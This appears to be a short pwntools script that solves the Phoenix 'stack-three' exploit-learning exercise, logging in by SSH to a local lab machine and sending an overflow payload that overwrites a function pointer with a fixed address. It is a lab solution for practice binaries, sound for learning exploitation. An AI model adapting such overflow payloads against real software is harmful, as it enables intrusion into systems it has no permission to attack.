from pwn import *
shell = ssh("user", "localhost", password="user", port=2222)

s = b"a" * 0x40 + p64(0x40069d)
sh = shell.run(b"/opt/phoenix/amd64/stack-three")
sh.recvlines(1)
sh.sendline(s)
print(sh.recvlines(2))
